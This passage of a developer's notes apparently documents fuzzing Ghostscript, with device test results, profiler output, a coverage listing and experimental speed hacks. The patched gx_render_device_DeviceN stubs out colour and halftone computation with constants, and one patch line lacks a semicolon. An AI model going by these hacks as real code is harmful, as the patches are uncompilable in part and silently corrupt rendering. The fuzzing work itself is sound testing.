[262] pgmraw          -> OK
[263] ml600           -> OK
[264] itk38           -> OK
[265] atx23           -> OK
[266] mgr4            -> OK
[267] lp9200c         -> OK
[268] hpdj400         -> UNKNOWN (string)
[269] tiffscaled      -> OK
[270] bmpsep1         -> OK
[271] png48           -> OK
[272] lp2563          -> OK
[273] epl5900         -> OK
[274] ps2write        -> OK
[275] x11alpha        -> OK
[276] r4081           -> OK
[277] lips4           -> OK
[278] cdjcolor        -> OK
[279] pgnm            -> OK
[280] necp6           -> OK
[281] iwhi            -> ERR 241
[282] atx24           -> OK
[283] mgr8            -> OK
[284] lp9300          -> OK
[285] hpdj500         -> UNKNOWN (string)
[286] tiffscaled24    -> OK
[287] bmpsep8         -> OK
[288] pngalpha        -> UNKNOWN (string)
[289] lp3000c         -> OK
[290] epl6100         -> OK
[291] psdcmyk         -> OK
[292] x11cmyk         -> OK
[293] rinkj           -> OK
[294] lips4v          -> OK
[295] cdjmono         -> OK
[296] pgnmraw         -> OK
[297] npdl            -> OK
[298] iwhic           -> ERR 241
[299] atx38           -> OK
[300] mgrgray2        -> OK
[301] lp9400          -> OK
[302] hpdj500c        -> UNKNOWN (string)
[303] tiffscaled32    -> OK
[304] ccr             -> OK
[305] pnggray         -> OK
[306] lp7500          -> OK
[307] epl6200         -> OK
[308] psdcmyk16       -> OK
[309] x11cmyk2        -> OK
[310] rpdl            -> OK
[311] lj250           -> OK
[312] cdnj500         -> OK
[313] pkm             -> OK
[314] oce9050         -> OK
[315] iwlo            -> ERR 241
[316] bj10e           -> OK
[317] mgrgray4        -> OK
[318] lp9500c         -> OK
[319] hpdj510         -> UNKNOWN (string)
[320] tiffscaled4     -> OK
[321] cfax            -> OK
[322] pngmono         -> OK
[323] lp7700          -> OK
[324] eplcolor        -> OK
[325] psdcmykog       -> OK
[326] x11cmyk4        -> OK
[327] samsunggdi      -> OK
[328] lj3100sw        -> OK
[329] chp2200         -> OK
[330] pkmraw          -> OK
[331] oki182          -> OK
[332] iwlow           -> ERR 241
[333] bj10v           -> OK
[334] mgrgray8        -> OK
[335] lp9600          -> OK
[336] hpdj520         -> UNKNOWN (string)
[337] tiffscaled8     -> OK
[338] cif             -> OK
[339] pngmonod        -> UNKNOWN (string)
[340] lp7900          -> OK
[341] eplmono         -> OK
[342] psdcmyktags     -> OK
[343] x11cmyk8        -> OK
[344] sj48            -> OK
[345] lj4dith         -> OK
[346] cljet5          -> OK
[347] pksm            -> OK
[348] oki4w           -> OK
[349] iwlq            -> ERR 241
[350] bj10vh          -> OK
[351] mgrmono         -> OK
[352] lp9600s         -> OK
[353] hpdj540         -> UNKNOWN (string)
[354] tiffsep         -> OK
[355] devicen         -> OK
[356] ocr             -> UNKNOWN (string)
[357] lp8000          -> OK
[358] eps9high        -> OK
[359] psdcmyktags16   -> OK
[360] x11gray2        -> OK
[361] st800           -> OK
[362] lj4dithp        -> OK
[363] cljet5c         -> OK
[364] pksmraw         -> OK
[365] okiibm          -> ERR 1
[366] iwlqc           -> ERR 241
[367] bj200           -> OK
[368] miff24          -> OK
```

so over 90% are now covered nicely. I don't want to bother supporting all of them and I think this is good enough for now...

## Adding persistent fuzzing...

So now I think it is time to finally improve the speed of our fuzzer. Currently we are initializing the gs instance on each fuzz cycle, but I think it should be better if we reuse the gs instance, but this doesn't work, since we may have to use another output device on the next run...

... an hour later ...

Ok, so I did some testing and it appears that the initialization cost of the fuzzer is negligible so it doesn't really matter...

## Improving fuzzer performance further

So first of all, I am compiling the fuzzer in debug mode, which limits performance significantly... after that I am going to take a good corpus of pdf files and I now have this here:

```
Each sample counts as 0.01 seconds.
  %   cumulative   self              self     total
 time   seconds   seconds    calls  ms/call  ms/call  name
  9.73     25.68    25.68 254659938     0.00     0.00  gx_render_device_DeviceN
  6.23     42.14    16.46   718125     0.02     0.21  image_render_color_DeviceN
  5.98     57.94    15.80 254762127     0.00     0.00  gx_remap_ICC_with_link
  4.49     69.80    11.86 254658790     0.00     0.00  cmap_rgb_halftoned
  4.14     80.72    10.92   496962     0.02     0.02  ycc_rgb_convert
  3.59     90.19     9.47 27040951     0.00     0.00  jpeg_idct_islow
  3.12     98.42     8.23 69652945     0.00     0.00  gx_dc_ht_colored_fill_rectangle
  2.98    106.28     7.86     2555     3.08     3.08  cmsReverseToneCurveEx
  2.55    113.02     6.74 613729773     0.00     0.00  cups_encode_color
  2.36    119.25     6.23 69573640     0.00     0.00  set_color_ht_le_4
  1.76    123.90     4.65    36634     0.13     3.05  clist_playback_band
  1.60    128.13     4.23     5166     0.82    50.46  gs_call_interp
  1.56    132.25     4.12 69548906     0.00     0.00  set_ht_colors_le_4
  1.54    136.31     4.06   243449     0.02     0.02  bits_replicate_horizontally
  1.34    139.85     3.54 254660810     0.00     0.00  cups_map_cmyk
  1.34    143.39     3.54 208646718     0.00     0.00  set_plane_color
  1.27    146.75     3.36 50634102     0.00     0.00  clist_copy_color
  1.16    149.81     3.06 203874161     0.00     0.00  gx_dc_ht_colored_read
  1.09    152.68     2.87   500219     0.01     0.01  inflate_fast
  0.94    155.15     2.47 203632351     0.00     0.00  gx_render_ht_default
  0.91    157.54     2.39 47591567     0.00     0.00  clip_copy_color
  0.83    159.73     2.19 47721209     0.00     0.00  clip_call_copy_color
  0.80    161.85     2.12  5141099     0.00     0.00  decode_mcu
  0.77    163.87     2.02 23120770     0.00     0.00  names_ref
  0.70    165.73     1.86 10406907     0.00     0.00  gs_scan_token
  0.70    167.57     1.84 254658790     0.00     0.00  cups_map_rgb
  0.70    169.41     1.84   194699     0.01     0.01  gx_build_blended_image_row
  0.69    171.22     1.81 69768502     0.00     0.00  mem_mono_copy_mono
  0.67    173.00     1.78  8297581     0.00     0.00  mark_fill_rect_add3_common
```

so there are a couple of functions which take the most amount of time. Here is one:

```
int
gx_render_device_DeviceN(frac * pcolor,
        gx_device_color * pdevc, gx_device * dev,
        gx_device_halftone * pdht, const gs_int_point * ht_phase)
{
    uint max_value[GS_CLIENT_COLOR_MAX_COMPONENTS];
    frac dither_check = 0;
    uint int_color[GS_CLIENT_COLOR_MAX_COMPONENTS];
    gx_color_value vcolor[GS_CLIENT_COLOR_MAX_COMPONENTS];
    int i;
    int num_colors = dev->color_info.num_components;
    uint l_color[GS_CLIENT_COLOR_MAX_COMPONENTS];

    for (i=0; i<num_colors; i++) {
        max_value[i] = (dev->color_info.gray_index == i) ?
             dev->color_info.dither_grays - 1 :
             dev->color_info.dither_colors - 1;
    }

    for (i = 0; i < num_colors; i++) {
        unsigned long hsize = pdht && i <= pdht->num_comp ?
                (unsigned) pdht->components[i].corder.num_levels
                : 1;
        unsigned long nshades = hsize * max_value[i] + 1;
        long shade = pcolor[i] * nshades / (frac_1_long + 1);
        int_color[i] = shade / hsize;
        l_color[i] = shade % hsize;
        if (max_value[i] < MIN_CONTONE_LEVELS)
            dither_check |= l_color[i];
    }

#ifdef DEBUG
    if (gs_debug_c('c')) {
        dmlprintf1(dev->memory, "[c]ncomp=%d ", num_colors);
        for (i = 0; i < num_colors; i++)
            dmlprintf1(dev->memory, "0x%x, ", pcolor[i]);
        dmlprintf(dev->memory, "-->   ");
        for (i = 0; i < num_colors; i++)
            dmlprintf2(dev->memory, "%x+0x%x, ", int_color[i], l_color[i]);
        dmlprintf(dev->memory, "\n");
    }
#endif

    /* Check for no dithering required */
    if (!dither_check) {
        for (i = 0; i < num_colors; i++)
            vcolor[i] = fractional_color(int_color[i], max_value[i]);
        color_set_pure(pdevc, dev_proc(dev, encode_color)(dev, vcolor));
        return 0;
    }

    /* Use the slow, general colored halftone algorithm. */

    for (i = 0; i < num_colors; i++)
        _color_set_c(pdevc, i, int_color[i], l_color[i]);
    gx_complete_halftone(pdevc, num_colors, pdht);

    if (pdht)
        color_set_phase_mod(pdevc, ht_phase->x, ht_phase->y,
                            pdht->lcm_width, pdht->lcm_height);

    /* Determine if we are using only one component */
    if (!(pdevc->colors.colored.plane_mask &
         (pdevc->colors.colored.plane_mask - 1))) {
        /* We can reduce this color to a binary halftone or pure color. */
        return gx_devn_reduce_colored_halftone(pdevc, dev);
    }

    return 1;
}
```

this loop here is maybe to blame???

```

    for (i=0; i<num_colors; i++) {
        max_value[i] = (dev->color_info.gray_index == i) ?
             dev->color_info.dither_grays - 1 :
             dev->color_info.dither_colors - 1;
    }

    for (i = 0; i < num_colors; i++) {
        unsigned long hsize = pdht && i <= pdht->num_comp ?
                (unsigned) pdht->components[i].corder.num_levels
                : 1;
        unsigned long nshades = hsize * max_value[i] + 1;
        long shade = pcolor[i] * nshades / (frac_1_long + 1);
        int_color[i] = shade / hsize;
        l_color[i] = shade % hsize;
        if (max_value[i] < MIN_CONTONE_LEVELS)
            dither_check |= l_color[i];
    }

```

Let's just try to modify that a bit and see what happens...

Here is the patched version:

```
/*
 * Render DeviceN possibly by halftoning.
 *  pcolors = pointer to an array color values (as fracs)
 *  pdevc - pointer to device color structure
 *  dev = pointer to device data structure
 *  pht = pointer to halftone data structure
 *  ht_phase  = halftone phase
 *  gray_colorspace = true -> current color space is DeviceGray.
 *  This is part of a kludge to minimize differences in the
 *  regression testing.
 */
int
gx_render_device_DeviceN(frac * pcolor,
        gx_device_color * pdevc, gx_device * dev,
        gx_device_halftone * pdht, const gs_int_point * ht_phase)
{
    uint max_value[GS_CLIENT_COLOR_MAX_COMPONENTS];
    frac dither_check = 0;
    uint int_color[GS_CLIENT_COLOR_MAX_COMPONENTS];
    gx_color_value vcolor[GS_CLIENT_COLOR_MAX_COMPONENTS];
    int i;
    int num_colors = dev->color_info.num_components;
    uint l_color[GS_CLIENT_COLOR_MAX_COMPONENTS];
    /*
    for (i=0; i<num_colors; i++) {
        max_value[i] = (dev->color_info.gray_index == i) ?
             dev->color_info.dither_grays - 1 :
             dev->color_info.dither_colors - 1;
    }
    */

    for (i=0; i<num_colors; i++) {
        max_value[i] = 1;
    }

    /*
    for (i = 0; i < num_colors; i++) {
        unsigned long hsize = pdht && i <= pdht->num_comp ?
                (unsigned) pdht->components[i].corder.num_levels
                : 1;
        unsigned long nshades = hsize * max_value[i] + 1;
        long shade = pcolor[i] * nshades / (frac_1_long + 1);
        int_color[i] = shade / hsize;
        l_color[i] = shade % hsize;
        if (max_value[i] < MIN_CONTONE_LEVELS)
            dither_check |= l_color[i];
    }

    */

    for (i = 0; i < num_colors; i++) {
        int_color[i] = 1;
        l_color[i] = 1;
        /*
        if (max_value[i] < MIN_CONTONE_LEVELS)
            dither_check |= l_color[i];
        */
    }


    /* Check for no dithering required */
    if (!dither_check) {
        for (i = 0; i < num_colors; i++)
            vcolor[i] = fractional_color(int_color[i], max_value[i]);
        color_set_pure(pdevc, dev_proc(dev, encode_color)(dev, vcolor));
        return 0;
    }
```

Ok, so I just patched that out and now it is slightly faster. I also think that just disabling sanitization in performance critical functions should be good, because asan adds overhead...

```

int
gx_render_device_DeviceN(frac * pcolor,
        gx_device_color * pdevc, gx_device * dev,
        gx_device_halftone * pdht, const gs_int_point * ht_phase)
{
    uint max_value[GS_CLIENT_COLOR_MAX_COMPONENTS];
    frac dither_check = 0;
    uint int_color[GS_CLIENT_COLOR_MAX_COMPONENTS];
    gx_color_value vcolor[GS_CLIENT_COLOR_MAX_COMPONENTS];
    int i;
    int num_colors = dev->color_info.num_components;
    uint l_color[GS_CLIENT_COLOR_MAX_COMPONENTS];
    /*
    for (i=0; i<num_colors; i++) {
        max_value[i] = (dev->color_info.gray_index == i) ?
             dev->color_info.dither_grays - 1 :
             dev->color_info.dither_colors - 1;
    }
    */

    for (i=0; i<num_colors; i++) {
        max_value[i] = 1;
    }

    /*
    for (i = 0; i < num_colors; i++) {
        unsigned long hsize = pdht && i <= pdht->num_comp ?
                (unsigned) pdht->components[i].corder.num_levels
                : 1;
        unsigned long nshades = hsize * max_value[i] + 1;
        long shade = pcolor[i] * nshades / (frac_1_long + 1);
        int_color[i] = shade / hsize;
        l_color[i] = shade % hsize;
        if (max_value[i] < MIN_CONTONE_LEVELS)
            dither_check |= l_color[i];
    }

    */

    for (i = 0; i < num_colors; i++) {
        int_color[i] = 1;
        l_color[i] = 1;
        /*
        if (max_value[i] < MIN_CONTONE_LEVELS)
            dither_check |= l_color[i];
        */
    }


    /* Check for no dithering required */
    if (!dither_check) {
        //for (i = 0; i < num_colors; i++)
        //    vcolor[i] = fractional_color(int_color[i], max_value[i]);
        memset(vcolor, 0, sizeof(vcolor))
        color_set_pure(pdevc, dev_proc(dev, encode_color)(dev, vcolor));
        return 0;
    }

    /* Use the slow, general colored halftone algorithm. */

    for (i = 0; i < num_colors; i++)
        _color_set_c(pdevc, i, int_color[i], l_color[i]);
    gx_complete_halftone(pdevc, num_colors, pdht);

    if (pdht)
        color_set_phase_mod(pdevc, ht_phase->x, ht_phase->y,
                            pdht->lcm_width, pdht->lcm_height);

    /* Determine if we are using only one component */
    if (!(pdevc->colors.colored.plane_mask &
         (pdevc->colors.colored.plane_mask - 1))) {
        /* We can reduce this color to a binary halftone or pure color. */
        return gx_devn_reduce_colored_halftone(pdevc, dev);
    }

    return 1;
}


```


the original is here:

```

/*
 * Render DeviceN possibly by halftoning.
 *  pcolors = pointer to an array color values (as fracs)
 *  pdevc - pointer to device color structure
 *  dev = pointer to device data structure
 *  pht = pointer to halftone data structure
 *  ht_phase  = halftone phase
 *  gray_colorspace = true -> current color space is DeviceGray.
 *  This is part of a kludge to minimize differences in the
 *  regression testing.
 */
int
gx_render_device_DeviceN(frac * pcolor,
        gx_device_color * pdevc, gx_device * dev,
        gx_device_halftone * pdht, const gs_int_point * ht_phase)
{
    uint max_value[GS_CLIENT_COLOR_MAX_COMPONENTS];
    frac dither_check = 0;
    uint int_color[GS_CLIENT_COLOR_MAX_COMPONENTS];
    gx_color_value vcolor[GS_CLIENT_COLOR_MAX_COMPONENTS];
    int i;
    int num_colors = dev->color_info.num_components;
    uint l_color[GS_CLIENT_COLOR_MAX_COMPONENTS];

    for (i=0; i<num_colors; i++) {
        max_value[i] = (dev->color_info.gray_index == i) ?
             dev->color_info.dither_grays - 1 :
             dev->color_info.dither_colors - 1;
    }

    for (i = 0; i < num_colors; i++) {
        unsigned long hsize = pdht && i <= pdht->num_comp ?
                (unsigned) pdht->components[i].corder.num_levels
                : 1;
        unsigned long nshades = hsize * max_value[i] + 1;
        long shade = pcolor[i] * nshades / (frac_1_long + 1);
        int_color[i] = shade / hsize;
        l_color[i] = shade % hsize;
        if (max_value[i] < MIN_CONTONE_LEVELS)
            dither_check |= l_color[i];
    }

#ifdef DEBUG
    if (gs_debug_c('c')) {
        dmlprintf1(dev->memory, "[c]ncomp=%d ", num_colors);
        for (i = 0; i < num_colors; i++)
            dmlprintf1(dev->memory, "0x%x, ", pcolor[i]);
        dmlprintf(dev->memory, "-->   ");
        for (i = 0; i < num_colors; i++)
            dmlprintf2(dev->memory, "%x+0x%x, ", int_color[i], l_color[i]);
        dmlprintf(dev->memory, "\n");
    }
#endif

    /* Check for no dithering required */
    if (!dither_check) {
        for (i = 0; i < num_colors; i++)
            vcolor[i] = fractional_color(int_color[i], max_value[i]);
        color_set_pure(pdevc, dev_proc(dev, encode_color)(dev, vcolor));
        return 0;
    }

    /* Use the slow, general colored halftone algorithm. */

    for (i = 0; i < num_colors; i++)
        _color_set_c(pdevc, i, int_color[i], l_color[i]);
    gx_complete_halftone(pdevc, num_colors, pdht);

    if (pdht)
        color_set_phase_mod(pdevc, ht_phase->x, ht_phase->y,
                            pdht->lcm_width, pdht->lcm_height);

    /* Determine if we are using only one component */
    if (!(pdevc->colors.colored.plane_mask &
         (pdevc->colors.colored.plane_mask - 1))) {
        /* We can reduce this color to a binary halftone or pure color. */
        return gx_devn_reduce_colored_halftone(pdevc, dev);
    }

    return 1;
}

```

so it looks like if you just return 0 from that function instead of 1, then it skips some stuff maybe???

So I did some digging and the call to that function does something called halftoning:

```
static void
cmapper_transfer_halftone_add(gx_cmapper_t *data)
{
    gx_color_value *pconc = &data->conc[0];
    const gs_gstate * pgs = data->pgs;
    gx_device * dev = data->dev;
    gs_color_select_t select = data->select;
    uchar ncomps = dev->color_info.num_components;
    frac frac_value;
    uchar i;
    frac cv_frac[GX_DEVICE_COLOR_MAX_COMPONENTS];

    /* apply the transfer function(s) */
    for (i = 0; i < ncomps; i++) {
        frac_value = cv2frac(pconc[i]);
        cv_frac[i] = gx_map_color_frac(pgs, frac_value, effective_transfer[i]);
    }
    /* Halftoning */
    if (gx_render_device_DeviceN(&(cv_frac[0]), &data->devc, dev,
                    gx_select_dev_ht(pgs), &pgs->screen_phase[select]) == 1)
        gx_color_load_select(&data->devc, pgs, dev, select);
}
```

So disabling that to always return 0 instead is actually the way to go maybe???

Here is the current thing:

```
 time   seconds   seconds    calls  ms/call  ms/call  name
  8.77      8.26     8.26     8199     1.01    10.61  gs_call_interp
  6.44     14.32     6.06     1205     5.03     5.03  cmsReverseToneCurveEx
  4.96     18.99     4.67 16572991     0.00     0.00  gs_scan_token
  4.50     23.23     4.24 29331453     0.00     0.00  names_ref
  2.72     25.79     2.56 137189931     0.00     0.00  LinLerp1D
  2.59     28.23     2.44 142897875     0.00     0.00  cmsEvalToneCurveFloat
  2.44     30.53     2.30 11170758     0.00     0.00  Eval4Inputs
  2.37     32.76     2.23 50402727     0.00     0.00  EvaluateMatrix
  2.25     34.88     2.12 32172546     0.00     0.00  dstack_find_name_by_index
  1.88     36.65     1.77    17720     0.10     0.10  inflate_fast
  1.81     38.35     1.70 25899657     0.00     0.00  dict_find
  1.68     39.93     1.58 21654981     0.00     0.00  _LUTevalFloat
  1.67     41.50     1.57     3063     0.51     5.95  cmsStageSampleCLut16bit
  1.58     42.99     1.49 12056886     0.00     0.00  igc_reloc_ref_ptr_nocheck
```

maybe I can disable the address sanitization from the gs_call_interp

## Other notes...

When looking at the coverage which the fuzzer found, there appears to be this interesting looking section:

```
     375              : /******************************************************************************
     376              :
     377              :   Function: eprn_read_media_data
     378              :
     379              :   This function reads a media configuration file and stores the result in
     380              :   '*eprn'.  The file name must already have been stored in 'eprn->media_file',
     381              :   'eprn->media_overrides' should be NULL.
     382              :
     383              :   The function returns zero on success and a non-zero ghostscript error value
     384              :   otherwise. In the latter case, an error message will have been issued.
     385              :
     386              : ******************************************************************************/
     387              :
     388              : #define BUFFER_SIZE     200
     389              :   /* should be large enough for a single line */
     390              :
     391              : #define cleanup()       (free(list), gp_fclose(f))
     392              :
     393            0 : static int eprn_read_media_data(mediasize_table *tables, eprn_Eprn *eprn, gs_memory_t *memory)
     394              : {
     395            0 :   char buffer[BUFFER_SIZE];
     396            0 :   const char
     397            0 :     *epref = eprn->CUPS_messages? CUPS_ERRPREF: "",
     398            0 :     *wpref = eprn->CUPS_messages? CUPS_WARNPREF: "";
     399            0 :   gp_file *f;
     400            0 :   float conversion_factor = BP_PER_IN;
     401              :     /* values read have to be multiplied by this value to obtain bp */
     402            0 :   int
     403            0 :     line = 0,   /* line number */
     404            0 :     read = 0;   /* number of entries read so far */
     405            0 :   eprn_PageDescription *list = NULL;
     406              :
     407              :   /* Open the file */
     408            0 :   if ((f = gp_fopen(memory, eprn->media_file, "r")) == NULL) {
     409            0 :     eprintf5("%s" ERRPREF "Error opening the media configuration file\n"
     410              :       "%s    `%s'\n%s  for reading: %s.\n",
     411              :       epref, epref, eprn->media_file, epref, strerror(errno));
     412            0 :     return_error(gs_error_invalidfileaccess);
     413              :   }
     414              :
     415              :   /* Loop over input lines */
     416            0 :   while (gp_fgets(buffer, BUFFER_SIZE, f) != NULL) {
     417            0 :     char *s, *t;
     418            0 :     eprn_PageDescription *current;
     419            0 :     int chars_read;
     420              :
     421            0 :     line++;
     422              :
     423              :     /* Check for buffer overflow */
     424            0 :     if ((s = strchr(buffer, '\n')) == NULL && gp_fgetc(f) != EOF) {
     425            0 :       eprintf5("%s" ERRPREF "Exceeding line length %d in "
     426              :           "media configuration file\n%s  %s, line %d.\n",
     427              :         epref, BUFFER_SIZE - 2 /* '\n'+'\0' */, epref, eprn->media_file, line);
     428            0 :       cleanup();
     429            0 :       return_error(gs_error_limitcheck);
     430              :     }
     431              :
     432              :     /* Eliminate the newline character */
     433            0 :     if (s != NULL) *s = '\0';
     434              :
     435              :     /*  Originally, I did nothing further at this point and used a
     436              :         "%g %g %g %g %n" format in the sscanf() call below to skip trailing
     437              :         blanks. This does not work with Microsoft Visual C up to at least
     438              :         version 6 (_MSC_VER is 1200) because the variable for %n will never be
     439              :         set. If one drops the blank, it will be set, also if there are
     440              :         additional directives after %n. In addition, Cygwin does not (as of
     441              :         early 2001) set the %n variable if there is trailing white space in the
     442              :         string scanned. I don't want to know what's going on there, I just
     443              :         foil these bugs by removing all trailing white space from the input
     444              :         line which means I don't have to scan it afterwards.
     445              :     */
     446            0 :     if (s == NULL) s = strchr(buffer, '\0');
     447            0 :     while (buffer < s && isspace(*(s-1))) s--;
     448            0 :     *s = '\0';
     449              :
     450              :     /* Ignore blank and comment lines */
     451            0 :     s = buffer;
     452            0 :     while (isspace(*s)) s++;
     453            0 :     if (*s == '\0' || *s == '#') continue;
     454              :
     455              :     /* Check for unit specification */
     456            0 :     if (is_word(s, "unit")) {
     457            0 :       char *unit_name = next_word(s);
     458            0 :       if (unit_name != NULL) {
     459            0 :         s = next_word(unit_name);
     460            0 :         if (s == NULL) {
     461            0 :           if (is_word(unit_name, "in")) {
     462            0 :             conversion_factor = BP_PER_IN;
     463            0 :             continue;
     464              :           }
     465            0 :           if (is_word(unit_name, "mm")) {
     466            0 :             conversion_factor = BP_PER_MM;
     467            0 :             continue;
     468              :           }
     469              :         }
     470              :         /* If 's' is not NULL or the unit is not recognized, the error message
     471              :            will be generated when the attempt to read the whole line as a media
     472              :            specification will fail because there is no media size called
     473              :            "unit". */
     474              :       }
     475              :     }
     476              :
     477              :     /* Extend the list */
     478              :     {
     479            0 :       eprn_PageDescription *new_list;
     480            0 :       new_list = (eprn_PageDescription *)
     481            0 :         realloc(list, ((size_t)read+1)*sizeof(eprn_PageDescription));
     482            0 :       if (new_list == NULL) {
     483            0 :         eprintf2("%s" ERRPREF
     484              :           "Memory allocation failure in eprn_read_media_data(): %s.\n",
     485              :           epref, strerror(errno));
     486            0 :         cleanup();
     487            0 :         return_error(gs_error_VMerror);
     488              :       }
     489            0 :       list = new_list;
     490              :     }
     491              :
     492              :     /* Set 'current' on the new entry */
     493            0 :     current = list + read;
     494              :
     495              :     /* Isolate and identify the media size name */
     496            0 :     s = buffer;
     497            0 :     while (isspace(*s)) s++;
     498            0 :     t = s + 1;  /* we checked above that the line is not empty */
     499            0 :     while (*t != '\0' && !isspace(*t)) t++;
     500            0 :     if (*t != '\0') {
     501            0 :       *t = '\0';
     502            0 :       t++;
     503              :     }
     504              :     {
     505            0 :       ms_MediaCode code = ms_find_code_from_name(tables, s, eprn->flag_desc);
     506            0 :       if (code == ms_none) {
     507            0 :         eprintf5("%s" ERRPREF "Unknown media name (%s) in "
     508              :             "media configuration file\n%s  %s, line %d.\n",
     509              :           epref, s, epref, eprn->media_file, line);
     510            0 :         cleanup();
     511            0 :         return_error(gs_error_rangecheck);
     512              :       }
     513            0 :       if (code & MS_ROTATED_FLAG) {
     514            0 :         eprintf5("%s" ERRPREF "Invalid substring \"" MS_ROTATED_STRING
     515              :             "\" in media name (%s)\n"
     516              :           "%s  in media configuration file %s, line %d.\n",
     517              :           epref, s, epref, eprn->media_file, line);
     518            0 :         cleanup();
     519            0 :         return_error(gs_error_rangecheck);
     520              :       }
     521            0 :       current->code = code;
     522              :     }
     523              :
     524              :     /* Look for margins */
     525            0 :     if (sscanf(t, "%g %g %g %g%n", &current->left,
     526            0 :           &current->bottom, &current->right, &current->top, &chars_read) != 4 ||
     527            0 :         t[chars_read] != '\0') {
     528            0 :       if (*t != '\0') *(t-1) = ' ';     /* remove NUL after media name */
     529            0 :       eprintf5("%s" ERRPREF
     530              :         "Syntax error in media configuration file %s, line %d:\n%s    %s\n",
     531              :         epref, eprn->media_file, line, epref, buffer);
     532            0 :       cleanup();
     533            0 :       return_error(gs_error_rangecheck);
     534              :     }
     535              :
     536              :     /* Check for sign */
     537            0 :     if (current->left < 0 || current->bottom < 0 || current->right < 0 ||
     538            0 :         current->top < 0) {
     539            0 :       eprintf4("%s" ERRPREF
     540              :         "Ghostscript does not support negative margins (line %d in the\n"
     541              :         "%s  media configuration file %s).\n",
     542              :         epref, line, epref, eprn->media_file);
     543            0 :       cleanup();
     544            0 :       return_error(gs_error_rangecheck);
     545              :     }
     546              :
     547            0 :     read++;
     548              :
     549              :     /* Convert to bp */
     550            0 :     current->left   *= conversion_factor;
     551            0 :     current->bottom *= conversion_factor;
     552            0 :     current->right  *= conversion_factor;
     553            0 :     current->top    *= conversion_factor;
     554              :
     555              :     /* A margin for custom page sizes without the corresponding capability in
     556              :        the printer is useless although it would not lead to a failure of eprn.
     557              :        The user might not notice the reason without help, hence we check. */
     558            0 :     if (ms_without_flags(current->code) == ms_CustomPageSize &&
     559            0 :         eprn->cap->custom == NULL)
     560            0 :       eprintf6("%s" WARNPREF "The media configuration file %s\n"
     561              :         "%s    contains a custom page size entry in line %d, "
     562              :           "but custom page sizes\n"
     563              :         "%s    are not supported by the %s.\n",
     564              :         wpref, eprn->media_file, wpref, line, wpref, eprn->cap->name);
     565              :   }
     566            0 :   if (gp_ferror(f)) {
     567            0 :     eprintf2("%s" ERRPREF
     568              :       "Unidentified system error while reading `%s'.\n",
     569              :       epref, eprn->media_file);
     570            0 :     cleanup();
     571            0 :     return_error(gs_error_invalidfileaccess);
     572              :   }
     573            0 :   gp_fclose(f);
     574              :
     575              :   /* Was the file empty? */
     576            0 :   if (read == 0) {
     577            0 :     eprintf3("%s" ERRPREF "The media configuration file %s\n"
     578              :       "%s  does not contain any media information.\n",
     579              :       epref, eprn->media_file, epref);
     580            0 :     return_error(gs_error_rangecheck);
     581              :   }
     582              :
     583              :   /* Create a list in the device structure */
     584            0 :   eprn->media_overrides = (eprn_PageDescription *) gs_malloc(memory, read + 1,
     585              :     sizeof(eprn_PageDescription), "eprn_read_media_data");
     586            0 :   if (eprn->media_overrides == NULL) {
     587            0 :     eprintf1("%s" ERRPREF
     588              :       "Memory allocation failure from gs_malloc() in eprn_read_media_data().\n",
     589              :       epref);
     590            0 :     free(list);
     591            0 :     return_error(gs_error_VMerror);
     592              :   }
     593              :
     594              :   /* Copy the list and set the sentinel entry */
     595            0 :   memcpy(eprn->media_overrides, list, read*sizeof(eprn_PageDescription));
     596            0 :   eprn->media_overrides[read].code = ms_none;
     597              :
     598              :   /* Cleanup */
     599            0 :   free(list);
     600              :
     601            0 :   return 0;
     602              : }
     603              :
```

which has zero coverage...

## TODO

- Persistent fuzzing
- Fix problems with all the different output devices...
- Make fuzzing more efficient otherwise...













